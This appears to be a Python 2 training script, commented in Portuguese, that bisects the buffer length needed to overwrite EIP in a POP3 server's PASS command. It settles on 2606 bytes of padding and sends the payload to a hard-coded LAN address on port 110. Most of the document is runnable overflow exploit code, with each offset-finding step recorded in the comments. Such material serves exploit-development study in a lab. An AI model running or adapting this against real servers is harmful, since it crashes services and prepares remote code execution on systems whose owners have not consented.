#!/usr/bin/python

import socket

#Na linha a baixo e possivel ver que a aplicacao sofre uma parada (crash) com 2900 bytes), mas e necessario, saber com qtos bytes exatos caimos em EIP
#bytes = 'A' * 2900

#Para isso dividiremos pela metade sendo 1400 bytes com a letra A (hex 41) e 1400 com a letra B (hex 42)
#bytes = 'A' * 1400 + 'B' * 14000

#Visto que enviando 1400 A e 1400 B a aplicacao parou de responder na letra B, sera necessario realizar mais testes dividindo os 1400 bytes de B em dois
#bytes = 'A' * 1400 + 'B' * 14000

#Abaixo dividimos os 1400 bytes de B em dois sendo 700 B e 700 C (hex 43)
#bytes = 'A' * 1400 + 'B' * 700 + 'C' * 700

#Nos testes foram detectados que houve quebra da aplicacao na letra C, entao sera divido os 700 bytes de C por 2, enviando o C com 350 e a letra D (he 44) com 350. Sempre a ultima letra tem seu valor de bytes dividos para identificar qual a qta de bytes necessarios para chegar no EIP
bytes = 'A' * 1400 + 'B' * 700 + 'C' * 350 + 'D' * 350

#Uma vez que a aplicacao quebrou no D podemos sumarizar o codigo e enviar os valores de A + B + C somados (total de 2450) atribuidos a letra A e dividir os 250 por 2, enviando como a letra B 175 e a letra C com 175
#bytes = 'A' * 2450 + 'B' * 175 + 'C' * 175

#A aplicacao parou de responder na letra B, entao o valor procurado esta na letra B, por isso vamos deixar o B com 100 e o C com 75 
#bytes = 'A' * 2450 + 'B' * 100 + 'C' * 75

#No ultimo teste a aplicacao quebrou na letra C, entao vamos pegar os 100 bytes de B e somalos com A. E dividir o valor de C colocando  50 em B e 25 em C
#bytes = 'A' * 2550 + 'B' * 50 + 'C' * 25

#Agora a aplicacao quebrou C, entao vamos jogar os 50 bytes de B para A e deixar o B com 12 bytes
#bytes = 'A' * 2600 + 'B' * 12

#Visto que o EIP esta com a letra B, vamos dividir os bytes de B por 2, enviando  6 bytes na letra B 
#bytes = 'A' * 2600 + 'B' * 6

#Uma vez que com 2606 Bytes atingimos o EBP, precisamos de 4 bytes para atingirmos o EIP. Entao vamos mandar Duas letras B e duas letras C
#Uma observacao seria que no meu teste notei que precisariam de 5 bytes e nao 4 como esta no treinamento para sobrescrever todo o registrador do EIP
#Exemplo usando mutiplicacao
#bytes = 'A' * 2606 + 'B' * 4
#Abaixo o teste do treinamento
#bytes = 'A' * 2606 + 'BBCC'
#Meu teste
bytes = 'A' * 2606 + 'BBCCC'


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect(('192.168.0.104',110))
	r = s.recv(1024)
	print r

	s.send('USER teste\r\n')
	r = s.recv(1024)
	print r

	s.send('PASS' + bytes + '\r\n')
	r = s.recv(1024)
	print r


	s.send('QUIT\r\n')
	r = s.recv(1024)
	print r

except:
	print "Erro ao conectar"		
